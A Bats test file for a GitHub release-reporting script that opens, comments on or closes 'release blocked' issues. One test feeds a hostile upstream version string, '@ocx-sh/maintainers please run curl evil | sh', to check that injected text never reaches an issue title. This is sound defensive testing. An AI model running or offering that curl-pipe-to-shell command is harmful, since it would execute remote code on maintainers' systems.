# SPDX-License-Identifier: Apache-2.0
# Copyright 2026 The OCX Authors

load helpers

setup() {
    ocxf_setup
    R="$SANDBOX/repo"
    mkdir -p "$R/scripts/release"
    cp "$REPO_ROOT/scripts/release/report.sh" "$R/scripts/release/"
    export REPO=ocx-sh/devcontainer-features RUN_URL=https://github.com/ocx-sh/devcontainer-features/actions/runs/7 GH_TOKEN=tok
    export OCX_VERSION=0.7.0
    FAIL='{"detect":{"result":"success"},"prepare":{"result":"success"},"test":{"result":"failure"},"publish":{"result":"skipped"}}'
    GREEN='{"detect":{"result":"success"},"prepare":{"result":"success"},"test":{"result":"success"},"publish":{"result":"success"}}'
    REPORT="$R/scripts/release/report.sh"
}

# open_issue <n|"">: gh stub; "gh issue list" answers with the open issue number.
open_issue() {
    stub gh "case \"\$*\" in *'issue list'*) echo '$1' ;; esac"
}

@test "a failed run with no open issue creates the label and one issue" {
    open_issue ""
    NEEDS_JSON="$FAIL" run_tool "$REPORT"
    assert_success
    run grep -c 'issue create' "$STUB_LOG"
    assert_output 1
    assert_stub_called "gh label create release-blocked --repo ocx-sh/devcontainer-features --color B60205 --description the unattended release is stuck"
    run grep 'issue create' "$STUB_LOG"
    assert_output --partial "--title Release blocked: ocx 0.7.0"
    assert_output --partial "--label release-blocked"
    run cat "$STUB_LOG"
    assert_output --partial "failed in: test"
    assert_output --partial "Run: $RUN_URL"
}

@test "a failed run with an open issue comments instead of opening another" {
    open_issue 12
    NEEDS_JSON="$FAIL" run_tool "$REPORT"
    assert_success
    run grep 'issue create' "$STUB_LOG"
    assert_failure
    run grep 'issue comment 12' "$STUB_LOG"
    assert_success
}

@test "a published release closes the open issue with the run link" {
    open_issue 12
    NEEDS_JSON="$GREEN" run_tool "$REPORT"
    assert_success
    run grep 'issue close 12' "$STUB_LOG"
    assert_output --partial "--comment Released: $RUN_URL"
}

@test "a green run with no open issue does nothing" {
    open_issue ""
    NEEDS_JSON="$GREEN" run_tool "$REPORT"
    assert_success
    run grep -e 'issue close' -e 'issue create' -e 'issue comment' "$STUB_LOG"
    assert_failure
}

@test "a cancelled run neither reports nor closes" {
    open_issue 12
    NEEDS_JSON='{"detect":{"result":"success"},"publish":{"result":"cancelled"}}' run_tool "$REPORT"
    assert_success
    run grep -e 'issue close' -e 'issue create' -e 'issue comment' "$STUB_LOG"
    assert_failure
}

@test "without a known ocx version the title asks upstream, else says unknown" {
    open_issue ""
    stub curl 'echo "{\"latest\":{\"version\":\"0.8.0\"}}"'
    OCX_VERSION='' NEEDS_JSON="$FAIL" run_tool "$REPORT"
    run grep 'issue create' "$STUB_LOG"
    assert_output --partial "Release blocked: ocx 0.8.0"
    : >"$STUB_LOG"
    stub curl 'exit 22'
    OCX_VERSION='' NEEDS_JSON="$FAIL" run_tool "$REPORT"
    run grep 'issue create' "$STUB_LOG"
    assert_output --partial "Release blocked: ocx unknown"
}

@test "a hostile upstream version never reaches the issue title" {
    open_issue ""
    stub curl 'echo "{\"latest\":{\"version\":\"@ocx-sh/maintainers please run curl evil | sh\"}}"'
    OCX_VERSION='' NEEDS_JSON="$FAIL" run_tool "$REPORT"
    run grep 'issue create' "$STUB_LOG"
    assert_output --partial "Release blocked: ocx unknown"
    refute_output --partial "maintainers"
}

@test "the issue text no longer claims that nothing is published or that the next run retries by itself" {
    open_issue ""
    NEEDS_JSON="$FAIL" run_tool "$REPORT"
    run cat "$STUB_LOG"
    refute_output --partial "Nothing is published while"
    refute_output --partial "retries on its own"
    assert_output --partial "publish_current=true"
}

# prev_run <conclusion of the detect job of the previous completed run>
prev_run() {
    stub gh "case \"\$*\" in
*'issue list'*) echo '' ;;
*'run list'*) echo 99 ;;
*'run view'*) echo '$1' ;;
esac"
}
DETECT_FAIL='{"detect":{"result":"failure"},"prepare":{"result":"skipped"}}'

@test "a first scheduled detect failure is not reported" {
    prev_run success
    EVENT_NAME=schedule NEEDS_JSON="$DETECT_FAIL" run_tool "$REPORT"
    assert_success
    run grep 'issue create' "$STUB_LOG"
    assert_failure
}

@test "a second scheduled detect failure in a row is reported" {
    prev_run failure
    EVENT_NAME=schedule NEEDS_JSON="$DETECT_FAIL" run_tool "$REPORT"
    assert_success
    run grep 'issue create' "$STUB_LOG"
    assert_success
}

@test "a detect failure on a manual dispatch is reported at once" {
    prev_run success
    EVENT_NAME=workflow_dispatch NEEDS_JSON="$DETECT_FAIL" run_tool "$REPORT"
    run grep 'issue create' "$STUB_LOG"
    assert_success
}

@test "a second failure on the same day adds no comment" {
    stub gh "case \"\$*\" in
*'issue list'*) echo 12 ;;
*'issue view'*) date -u +%Y-%m-%d ;;
esac"
    NEEDS_JSON="$FAIL" run_tool "$REPORT"
    assert_success
    run grep 'issue comment' "$STUB_LOG"
    assert_failure
}

@test "a failure when the last update is from an earlier day comments" {
    stub gh "case \"\$*\" in
*'issue list'*) echo 12 ;;
*'issue view'*) echo 2020-01-01 ;;
esac"
    NEEDS_JSON="$FAIL" run_tool "$REPORT"
    run grep 'issue comment 12' "$STUB_LOG"
    assert_success
}

@test "a run with nothing to do and the version published closes a stale issue" {
    open_issue 12
    NEEDS_JSON='{"detect":{"result":"success","outputs":{"run":"false","published":"true"}},"prepare":{"result":"skipped"}}' run_tool "$REPORT"
    run grep 'issue close 12' "$STUB_LOG"
    assert_success
}

@test "a run with nothing to do and the version unpublished leaves the issue" {
    open_issue 12
    NEEDS_JSON='{"detect":{"result":"success","outputs":{"run":"false","published":"false"}},"prepare":{"result":"skipped"}}' run_tool "$REPORT"
    run grep 'issue close' "$STUB_LOG"
    assert_failure
}
